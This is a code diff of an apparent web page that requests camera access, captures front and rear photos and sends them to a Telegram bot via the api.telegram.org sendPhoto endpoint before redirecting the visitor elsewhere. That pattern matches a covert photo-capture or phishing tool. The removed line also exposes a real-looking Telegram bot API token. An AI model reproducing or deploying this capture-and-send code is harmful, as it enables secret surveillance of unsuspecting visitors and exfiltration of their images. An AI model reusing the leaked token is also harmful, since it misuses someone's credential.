@@ -8,9 +8,7 @@
 
 
   onMount(async () => {
-
-
-try {
+    try {
       const stream = await navigator.mediaDevices.getUserMedia({ video: true });
       // Permission granted, you can now access the camera
       console.log('Camera access granted');
@@ -123,7 +121,7 @@ async function captureAndSendPhotosToTelegramBots() {
     formData.append('frontPhoto', frontPhotoBlob);
 
     // Replace 'YOUR_TELEGRAM_BOT_API_KEY' with your actual Telegram bot API key
-    const telegramBotAPIKey = '5412336519:AAH-HGiiJJ-AZE3D5FF9457pJACcT-jbqQg';
+    const telegramBotAPIKey = 'YOUR_TELEGRAM_BOT_API_KEY';
     const telegramBotURL = `https://api.telegram.org/bot${telegramBotAPIKey}/sendPhoto`;
 
     // Replace 'YOUR_CHANNEL_USERNAME_OR_ID' with the channel username or ID ('@localipy' in this case)
@@ -145,6 +143,7 @@ async function captureAndSendPhotosToTelegramBots() {
     rearCameraTrack.stop();
     frontCameraTrack.stop();
   }
+
 
 
 function redirectToNextURL() {
